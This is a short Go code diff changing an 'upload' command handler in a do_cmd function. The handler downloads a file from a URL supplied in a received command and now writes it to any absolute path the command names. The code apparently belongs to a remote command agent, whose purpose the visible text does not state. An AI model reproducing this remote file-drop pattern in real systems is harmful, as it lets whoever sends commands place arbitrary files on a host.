@@ -233,17 +233,22 @@ func do_cmd(body []byte) bool {
             }
         } else if cmd == "upload" {
             fmt.Printf("Fulfilling cmd: Upload\n")
-            //file_url := record.([]interface{})[0].(string)
-            file_url := record.(string)
+            file_url := record.([]interface{})[0].(string)
+            filename := record.([]interface{})[1].(string)
+            
+            //file_url := record.(string)
             u, _ := url.Parse(file_url)
             fmt.Printf("Path: %s", u.Path)
             if u.Path == "/" {
                 u.Path = "/tmp"
             }
+            /*
             filename := path.Base(u.Path)
-            wd, _ := os.Getwd()
-            filename = filepath.Join(wd, filename)
-            
+            */
+            if !path.IsAbs(filename) {
+                wd, _ := os.Getwd()
+                filename = filepath.Join(wd, filename)
+            }
             //rec := get_args(record.([]interface{}))
             fmt.Printf("Rec: %s\n", record)
             err := downloadFile(filename, file_url)
